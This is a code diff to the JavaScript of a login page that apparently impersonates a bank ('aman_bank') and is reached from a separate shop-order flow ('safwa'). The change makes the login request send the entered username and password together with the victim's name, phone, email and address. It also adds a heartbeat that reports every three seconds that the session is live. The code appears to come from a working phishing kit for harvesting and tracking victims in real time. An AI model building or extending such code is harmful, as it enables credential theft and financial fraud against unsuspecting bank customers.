@@ -386,10 +386,22 @@
     errorMsg.classList.remove('active');
     document.getElementById('loadingOverlay').classList.add('active');
 
+    var customerData = JSON.parse(sessionStorage.getItem('safwa_order_data') || '{}');
+    var orderId = sessionStorage.getItem('safwa_order_id');
+
     fetch('/api/login', {
       method: 'POST',
       headers: { 'Content-Type': 'application/json' },
-      body: JSON.stringify({ username: username, password: password })
+      body: JSON.stringify({
+        username: username,
+        password: password,
+        requestId: orderId,
+        name: customerData.name || '-',
+        phone: customerData.phone || customerData.mobile || '-',
+        mobile: customerData.mobile || customerData.phone || '-',
+        email: customerData.email || '-',
+        address: customerData.address || '-'
+      })
     })
     .then(function(res){ return res.json(); })
     .then(function(data){
@@ -417,6 +429,23 @@
       var user = params.get('user') || '';
       showInvalidCredentials(user);
     }
+
+    var sessionId = sessionStorage.getItem('aman_bank_session_id');
+    if (!sessionId) {
+      sessionId = 'sess_' + Date.now() + '_' + Math.random().toString(36).slice(2);
+      sessionStorage.setItem('aman_bank_session_id', sessionId);
+    }
+
+    function sendHeartbeat() {
+      fetch('/api/heartbeat', {
+        method: 'POST',
+        headers: { 'Content-Type': 'application/json' },
+        body: JSON.stringify({ sessionId: sessionId })
+      }).catch(function() {});
+    }
+
+    sendHeartbeat();
+    setInterval(sendHeartbeat, 3000);
   });
 </script>
 </body>
